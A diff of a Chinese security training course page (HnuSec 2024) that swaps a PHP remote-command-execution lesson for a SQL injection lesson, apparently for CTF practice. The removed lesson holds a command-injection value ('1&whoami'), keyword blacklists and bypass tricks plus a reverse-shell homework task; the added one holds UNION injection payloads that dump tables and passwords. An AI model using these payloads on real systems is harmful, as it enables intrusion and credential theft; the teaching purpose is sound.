@@ -16,7 +16,7 @@
     
     
       
-        <title>课前准备 - HnuSec 暑期培训 2024</title>
+        <title>数据库 - HnuSec 暑期培训 2024</title>
       
     
     
@@ -102,7 +102,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              课前准备
+              数据库
             
           </span>
         </div>
@@ -857,109 +857,93 @@
   
 
 
-<h1 id="_1">课前准备<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
-<p>1.安装好Linux系统（vm虚拟机或者wsl都可）</p>
-<p>2.配置好php语言环境（Windows和Linux都有最好）</p>
-<p>3.了解一下正则表达式</p>
-<h1 id="_2">基础知识<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
-<h2 id="linux">Linux系统需要的一些认识<a class="headerlink" href="#linux" title="Permanent link">&para;</a></h2>
-<ul>
-<li>
-<p>Linux是开源操作系统，可以更改源代码，而Windows是商业操作系统，没有访问源代码的权限。</p>
-</li>
-<li>
-<p>Linux运行速度更快，Windows在旧硬件上运行较慢。</p>
-</li>
-<li>
-<p>Linux提供更好的定制化和灵活性，Windows提供更友好的用户界面和更广泛的软件兼容性。</p>
-</li>
-<li>
-<p>Linux适用于程序设计和服务器工作且一般没有图形化界面，Windows适用于日常任务和桌面环境。</p>
-</li>
-</ul>
-<h2 id="linux_1">Linux系统的基本命令操作<a class="headerlink" href="#linux_1" title="Permanent link">&para;</a></h2>
-<p>Linux系统一切皆文件，我们要懂得对文件的基本操作</p>
-<h3 id="_3">查看当前目录存在的文件和文件夹<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
-<ul>
-<li>ls</li>
-</ul>
-<h3 id="_4">切换文件夹<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
-<ul>
-<li>cd xxx进入指定目录</li>
-<li>cd .. 返回上一级目录</li>
-</ul>
-<h3 id="_5">查看文件<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
-<ul>
-<li>cat</li>
-<li>tail</li>
-</ul>
-<h3 id="_6">创建文件<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
-<ul>
-<li>touch</li>
-</ul>
-<h3 id="_7">移动复制删除文件<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
-<ul>
-<li>cp /e1.txt /e2.txt 复制</li>
-<li>mv /1.txt /go/1.txt 移动</li>
-<li>rm 1.txt 删除</li>
-</ul>
-<h3 id="_8">编辑文件<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
-<ul>
-<li>vim 1.txt</li>
-</ul>
-<p>以上命令只是能能够让你快速上手linux并进行简单的操作，随着更深入的学习，命令会变得更复杂</p>
-<h1 id="rce">RCE<a class="headerlink" href="#rce" title="Permanent link">&para;</a></h1>
-<h2 id="rce_1">什么是RCE<a class="headerlink" href="#rce_1" title="Permanent link">&para;</a></h2>
-<p>rce是Remote Command Execute的缩写</p>
-<p>即远程执行命令，它可以是一种漏洞，也可以看作渗透测试的最后一环</p>
-<p>如果能成功rce，意味着你离成功不远了</p>
-<h2 id="rce_2">如何RCE<a class="headerlink" href="#rce_2" title="Permanent link">&para;</a></h2>
-<p>RCE基本要满足如下条件</p>
-<p><strong>存在危险函数且危险函数的参数可控</strong></p>
-<p>以php为例，有且不只这些危险函数</p>
+<h1 id="_1">数据库<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>数据库（database）是用来组织、存储和管理数据的仓库。<br />当今世界是一个充满着数据的互联网世界，为了方便管理互联网世界中的数据，就有了数据库管理系统的概念。用户可以对数据库中的数据进行新增、查询、更新、删除等操作。</p>
+<h1 id="sql">SQL<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h1>
+<p>SQL（Structured Query Language，结构化查询语言）是一种用于管理和操作关系型数据库的标准化编程语言。 <br />基于SQL语言的数据库：MySQL、SQL Server、Access、Oracle、Sybase、DB2等</p>
+<h1 id="mysql">MySQL<a class="headerlink" href="#mysql" title="Permanent link">&para;</a></h1>
+<p>MySQL 是最流行的数据库管理系统，在 WEB 应用方面最好的数据库管理应用软件之一</p>
+<h1 id="sql_1">SQL注入原理<a class="headerlink" href="#sql_1" title="Permanent link">&para;</a></h1>
+<p><img alt="" src="https://cdn.nlark.com/yuque/0/2024/jpeg/34908308/1723633959509-226680b9-3059-4f45-896e-ce5648e3aeb8.jpeg" /><br /> 当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。  </p>
+<h1 id="_2">前置语法知识<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<h2 id="_3">注释符<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code>#注释
+-- 注释
+
+/*
+注释
+*/
+</code></pre></div></td></tr></table></div>
+<h2 id="select">SELECT<a class="headerlink" href="#select" title="Permanent link">&para;</a></h2>
+<p>SELECT 语句用于从数据库中选取数据。<br />结果被存储在一个结果表中，称为结果集。
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span></pre></div></td><td class="code"><div><pre><span></span><code>-- 选择所有列的所有行
+SELECT * FROM users;
+
+-- 选择特定列的所有行
+SELECT username, email FROM users;
+
+-- 添加 WHERE 子句，选择满足条件的行
+SELECT * FROM users WHERE is_active = TRUE;
+
+SELECT 1,2,3;
+
+-- 显示当前所在数据库
+SELECT DATABASE();
+</code></pre></div></td></tr></table></div></p>
+<h2 id="order-by">ORDER BY<a class="headerlink" href="#order-by" title="Permanent link">&para;</a></h2>
+<p>用于对结果集按照一个列或者多个列进行排序<br />
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span>
 <span class="normal">3</span>
 <span class="normal">4</span>
 <span class="normal">5</span>
 <span class="normal">6</span>
-<span class="normal">7</span>
-<span class="normal">8</span>
-<span class="normal">9</span></pre></div></td><td class="code"><div><pre><span></span><code>执行系统命令的函数:
-有回显:
-system(),passthur()
-无回显:
-exec()
-shell_exec()
+<span class="normal">7</span></pre></div></td><td class="code"><div><pre><span></span><code>-- 添加 ORDER BY 子句，按照某列的升序排序
+SELECT * FROM users ORDER BY birthdate;
 
-执行php代码的函数:
-eval()
-</code></pre></div></td></tr></table></div>
-<p>通过这些危险函数，我们传入想执行的命令作为参数运行即可执行命令</p>
-<h3 id="_9">实例<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
-<p>在早期一些提供ping功能的地方可能会存在rce漏洞，如下</p>
+-- 添加 ORDER BY 子句，按照某列的降序排序
+SELECT * FROM users ORDER BY birthdate DESC;
+
+SELECT * FROM users ORDER BY 1;
+</code></pre></div></td></tr></table></div></p>
+<h2 id="union">UNION<a class="headerlink" href="#union" title="Permanent link">&para;</a></h2>
+<p>UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>SELECT city FROM customers UNION SELECT city FROM suppliers ORDER BY city;
+</code></pre></div></td></tr></table></div></p>
+<h2 id="group_concat">GROUP_CONCAT()<a class="headerlink" href="#group_concat" title="Permanent link">&para;</a></h2>
+<p>一种聚合函数，可以将满足条件的所有数据聚合到一列显示出来</p>
+<h2 id="information_schema">information_schema<a class="headerlink" href="#information_schema" title="Permanent link">&para;</a></h2>
+<p>mysql中自带的数据库，其中统计了这个所有数据库的表名、字段名</p>
+<h1 id="_4">联合注入<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<h2 id="_5">数字型注入<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<p>注入时输入参数为纯数字</p>
+<h2 id="_6">字符型注入<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<p>注入时输入参数要带引号等</p>
+<p>源码：
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span>
-<span class="normal">3</span>
-<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="x">if($_POST[&#39;ip&#39;]){</span>
-<span class="x">    $ip = $_POST[&#39;ip&#39;];</span>
-<span class="x">    system(&quot;ping &quot;.$ip);</span>
-<span class="x">}</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+
+4&#39; LIMIT 0,1
 </code></pre></div></td></tr></table></div>
-<p>危险函数system()存在且$ip参数可控</p>
-<p>我们只需给ip赋值为"1&amp;whoami"即可执行同时执行ping 1 和 whoami两条命令</p>
-<h2 id="rce_3">为什么要RCE<a class="headerlink" href="#rce_3" title="Permanent link">&para;</a></h2>
-<h3 id="ctf">在CTF中<a class="headerlink" href="#ctf" title="Permanent link">&para;</a></h3>
-<p>flag往往藏在网站根目录，所以我们要通过命令去读取flag</p>
-<h3 id="_10">在实战中<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
-<p>1.发现rce漏洞往往是高危漏洞</p>
-<p>2.通过rce控制主机有助于更深入的渗透</p>
-<h2 id="rcectf">RCE在CTF中的基础考察方式<a class="headerlink" href="#rcectf" title="Permanent link">&para;</a></h2>
-<p>通过上面实例我们知道，我们的漏洞利用过程为</p>
-<p>阅读源码&rarr;发现漏洞&rarr;利用漏洞</p>
-<p>那么对于新手而言往往注重考察如何利用漏洞，而不是阅读源码挖掘漏洞（因为这需要很深的代码功底）</p>
-<p>所以题目一般会很直接明了的给出哪里存在危险函数，且什么参数可控</p>
-<p>ctfshow-web29:</p>
+payload：
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
 <span class="normal"> 2</span>
 <span class="normal"> 3</span>
@@ -969,79 +953,32 @@ eval()
 <span class="normal"> 7</span>
 <span class="normal"> 8</span>
 <span class="normal"> 9</span>
-<span class="normal">10</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="x">error_reporting(0);</span>
-<span class="x">if(isset($_GET[&#39;c&#39;])){</span>
-<span class="x">    $c = $_GET[&#39;c&#39;];</span>
-<span class="x">    if(!preg_match(&quot;/flag/i&quot;, $c)){</span>
-<span class="x">        eval($c);</span>
-<span class="x">    }</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span></pre></div></td><td class="code"><div><pre><span></span><code># 找列数
+id=1&#39; order by 3-- s
+id=1&#39; order by 4-- s
+# 确定哪个字段有回显
+id=-1&#39; union select 1,2,3-- s
+# 确定当前数据库
+id=-1&#39; union select 1,2,database()-- s
+# 爆出当前数据库内的所有表名
+id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-- s
+# 爆出当前数据库user表的所有列名
+id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()-- s
 
-<span class="x">}else{</span>
-<span class="x">    highlight_file(__FILE__);</span>
-<span class="x">}</span>
-</code></pre></div></td></tr></table></div>
-<p>ctfshow-web34:</p>
-<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
-<span class="normal"> 2</span>
-<span class="normal"> 3</span>
-<span class="normal"> 4</span>
-<span class="normal"> 5</span>
-<span class="normal"> 6</span>
-<span class="normal"> 7</span>
-<span class="normal"> 8</span>
-<span class="normal"> 9</span>
-<span class="normal">10</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="x">error_reporting(0);</span>
-<span class="x">if(isset($_GET[&#39;c&#39;])){</span>
-<span class="x">    $c = $_GET[&#39;c&#39;];</span>
-<span class="x">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|\&quot;/i&quot;, $c)){</span>
-<span class="x">        eval($c);</span>
-<span class="x">    }</span>
-
-<span class="x">}else{</span>
-<span class="x">    highlight_file(__FILE__);</span>
-<span class="x">}</span>
-</code></pre></div></td></tr></table></div>
-<p>可见考察重点一般是放在ban关键词，绕关键词上，所以主要考察我们的绕过技巧</p>
-<h2 id="_11">关于绕过<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h2>
-<p>绕过的方式千奇百怪，但最重要的思想还是替代，下面仅介绍一些基础的替代</p>
-<h3 id="_12">查看类命令的替代<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
-<p>cat</p>
-<p>tail--看文件末尾，对一些比较长的文件才有显著效果</p>
-<p>sort--排序并输出内容</p>
-<p>tac</p>
-<p>head</p>
-<p>nl</p>
-<p>more</p>
-<p>less</p>
-<p>od（od -t d1 tmp flag）</p>
-<p>rev（rev flag | rev）</p>
-<h2 id="flag">flag字段的替代<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h2>
-<p>f*:匹配所有f开头的文件</p>
-<p>fla?:匹配所有flax，x代表任意字符</p>
-<p>fla[f-h]:匹配flaf，flag，flah</p>
-<p>fla{f,g.h}:匹配flaf，flag，flah</p>
-<p>f''lag = f""lag = flag</p>
-<p>以上的方法仅仅是让你明白何为“绕过”，当你明白“绕过”的概念后，可以将思维发散，多在网上收集资料，刷题，你会碰见很多千奇百怪的绕过</p>
-<h2 id="linux_2">你需要了解的一些linux命令行中的特殊字符<a class="headerlink" href="#linux_2" title="Permanent link">&para;</a></h2>
-<p><a href="https://www.cnblogs.com/balaamwe/archive/2012/03/15/2397998.html">linux特殊符号大全 - balaamwe - 博客园 (cnblogs.com)</a></p>
-<h2 id="_13">关于正则表达式<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h2>
-<p>对于关键词的禁用往往是通过正则表达式的形式书写的</p>
-<p>对于没有系统学习正则表达式的人来说看懂一些简单的过滤应该也问题不大</p>
-<p>但是认真学习正则表达式且会书写和利用它来做一些事情我认为还是很有帮助的</p>
-<h1 id="_14">课后作业<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h1>
-<ul>
-<li>
-<p>速通正则表达式https://regexlearn.com/zh-cn（附完成截图）</p>
-</li>
-<li>
-<p>思考一下当我们使用exec()而不是system()来执行命令时，我们该如何去得到回显结果（tip：反弹shell）（附成功反弹shell截图）</p>
-</li>
-<li>通过做题简单整理并收集一下自己的绕过词典，学习新的绕过方式</li>
-</ul>
-<p>推荐做题平台https://buuoj.cn/，<a href="https://www.nssctf.cn/index">诺赛斯 (nssctf.cn)</a></p>
-<p>课后作业最好为pdf或者md格式（若为md格式有图片必须一起打包）</p>
-<p>如果学有余力可以自己搭建一下题目环境，不用提交</p>
-<p>发送到邮箱<a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#49;&#48;&#54;&#48;&#48;&#56;&#57;&#51;&#55;&#49;&#64;&#113;&#113;&#46;&#99;&#111;&#109;">&#49;&#48;&#54;&#48;&#48;&#56;&#57;&#51;&#55;&#49;&#64;&#113;&#113;&#46;&#99;&#111;&#109;</a>(8.14号前)</p>
+id=-1&#39; union select 1,2,group_concat(password) from users-- s
+</code></pre></div></td></tr></table></div></p>
+<h1 id="_7">作业<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h1>
+<p>BUUCTF：</p>
+<ol>
+<li>[极客大挑战 2019]EasySQL</li>
+<li>BUU SQL COURSE 1</li>
+<li>[极客大挑战 2019]LoveSQL</li>
+</ol>
+<p>没思路可以参考网上的wp，做了写wp</p>
+<p>PDF格式发送到邮箱<a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#50;&#52;&#53;&#55;&#49;&#50;&#57;&#55;&#52;&#55;&#64;&#113;&#113;&#46;&#99;&#111;&#109;">&#50;&#52;&#53;&#55;&#49;&#50;&#57;&#55;&#52;&#55;&#64;&#113;&#113;&#46;&#99;&#111;&#109;</a>(8.17号前)</p>
 
 
 
@@ -1062,7 +999,7 @@ eval()
     <span class="md-icon" title="最后更新">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1-2.1-2M12.5 7v5.2l4 2.4-1 1L11 13V7h1.5M11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2v1.8Z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">2024年8月2日</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">2024年8月14日</span>
   </span>
 
     
@@ -1078,7 +1015,7 @@ eval()
     </span>
     <nav>
       
-        <a href="mailto:orxiain@outlook.com">orxiain.</a>
+        <a href="mailto:2457129747@qq.com">fr3e3</a>
     </nav>
   </span>
 
